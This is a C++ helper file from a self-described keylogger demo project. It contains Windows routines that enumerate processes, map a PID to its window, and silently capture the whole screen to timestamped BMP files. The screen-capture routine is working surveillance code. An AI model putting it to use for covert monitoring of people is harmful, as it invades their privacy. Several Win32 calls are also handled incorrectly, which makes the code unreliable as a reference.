/**@file util.cpp
 *
 * This is part of keylogger, demo project to hook key event of a process
 * and do periodic screenshoot of screen.
 *
 * @author Oky Firmansyah <mail@okyfirmansyah.net>.
 *
 * @date Created      : Apr 03, 2017 okyfirmansyah
 */

#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <functional>
#include <time.h>
#include <ole2.h>
#include <olectl.h>
#include "utils.h"

 /** implementation of some helper functions
  */

using namespace std;

/** used by getHwndFromProcessId
  */
static BOOL CALLBACK getHwndFromProcessIdCB(HWND hwnd, LPARAM lParam)
{
	auto func = reinterpret_cast<function<BOOL(HWND)>*>(lParam);
	return (*func)(hwnd);
}

/** get HWND from a PID
 */
HWND getHwndFromProcessId(DWORD processId)
{
	HWND gHwnd = nullptr;

	// Child routine
	auto func = [&processId, &gHwnd](HWND hwnd) -> BOOL
	{
		DWORD lpdwProcessId;
		GetWindowThreadProcessId(hwnd, &lpdwProcessId);
		if (lpdwProcessId == processId)
		{
			gHwnd = hwnd;
			return FALSE;
		}
		return TRUE;
	};

	// Iterate windows, each will call func()
	EnumWindows(getHwndFromProcessIdCB, reinterpret_cast<LPARAM>(&func));
	return gHwnd;
}

/** find first process that having name procName,
  * if found, execute func(entry) and stop
  */
void iterateProcess(const function<bool(PROCESSENTRY32W*)>& func)
{
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32FirstW(snapshot, &entry) == TRUE)
	{
		while (Process32NextW(snapshot, &entry) == TRUE)
		{
			if (func(&entry) == true)
				break;
		}
	}

	CloseHandle(snapshot);
}

/** find first process that having name procName,
  * if found, execute func(entry) and stop
  */
bool findFirstProcess(const wstring& procName, const function<void(PROCESSENTRY32W*)>& func)
{
	bool found = false;
	iterateProcess([&found, &func, &procName](PROCESSENTRY32W* entry) -> bool
	{
		if (procName.compare(entry->szExeFile) == 0)
		{
			found = true;
			func(entry);
			return true; // Break here
		}
		return false;
	});
	return found;
}

/** find process that having name procName,
  * each encounter will call func(entry)
  */
bool findProcess(const wstring& procName, const function<void(PROCESSENTRY32W*)>& func)
{
	bool found = false;
	iterateProcess([&found, &func, &procName](PROCESSENTRY32W* entry) -> bool
	{
		if (procName.compare(entry->szExeFile) == 0)
		{
			found = true;
			func(entry);
		}
		return false; // Always look for next process, even if already found
	});
	return found;
}

/** Dump HBITMA to bmp file (save .jpg for later)
  */
bool saveBitmap(const wstring& filename, HBITMAP bmp, HPALETTE pal)
{
	bool result = false;
	PICTDESC pd;

	pd.cbSizeofstruct = sizeof(PICTDESC);
	pd.picType = PICTYPE_BITMAP;
	pd.bmp.hbitmap = bmp;
	pd.bmp.hpal = pal;

	LPPICTURE picture;
	HRESULT res = OleCreatePictureIndirect(&pd, IID_IPicture, false,
		reinterpret_cast<void**>(&picture));

	if (!SUCCEEDED(res))
		return false;

	LPSTREAM stream;
	res = CreateStreamOnHGlobal(0, true, &stream);

	if (!SUCCEEDED(res))
	{
		picture->Release();
		return false;
	}

	LONG bytes_streamed;
	res = picture->SaveAsFile(stream, true, &bytes_streamed);

	HANDLE file = CreateFileW(filename.c_str(), GENERIC_WRITE, FILE_SHARE_READ, 0,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (!SUCCEEDED(res) || !file)
	{
		stream->Release();
		picture->Release();
		return false;
	}

	HGLOBAL mem = 0;
	GetHGlobalFromStream(stream, &mem);
	LPVOID data = GlobalLock(mem);

	DWORD bytes_written;
	result = !!WriteFile(file, data, bytes_streamed, &bytes_written, 0);
	result &= (bytes_written == static_cast<DWORD>(bytes_streamed));

	GlobalUnlock(mem);
	CloseHandle(file);

	stream->Release();
	picture->Release();

	return result;
}

/** Take screenshot, save it to the path\YYYYMMDD_HHMMSS.bmp
  */
bool takeScreenShot(const wstring& path)
{
	// Set filename
// Set filename
	time_t timer;
	char buffer[100];
	time(&timer);
	struct tm timeinfo;
	localtime_s(&timeinfo, &timer);


	// Snprintf (buffer,sizeof(buffer),"[%F %R]",timeinfo);
	snprintf(buffer, sizeof(buffer), "%.4d%.2d%.2d_%.2d%.2d%.2d.bmp", 1900 + timeinfo.tm_year,
		1 + timeinfo.tm_mon,
		timeinfo.tm_mday, // Fixed here
		timeinfo.tm_hour,
		timeinfo.tm_min,
		timeinfo.tm_sec);
	wstring filename = path + wstring(buffer, buffer + strlen(buffer));

	HDC hdcSource = GetDC(NULL);
	HDC hdcMemory = CreateCompatibleDC(hdcSource);

	int width = GetDeviceCaps(hdcSource, HORZRES);
	int height = GetDeviceCaps(hdcSource, VERTRES);

	HBITMAP hBitmap = CreateCompatibleBitmap(hdcSource, width, height);
	HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);

	BitBlt(hdcMemory, 0, 0, width, height, hdcSource, 0, 0, SRCCOPY);
	hBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmapOld);

	DeleteDC(hdcSource);
	DeleteDC(hdcMemory);

	HPALETTE hpal = nullptr;
	if (saveBitmap(filename, hBitmap, hpal)) return true;
	return false;
}
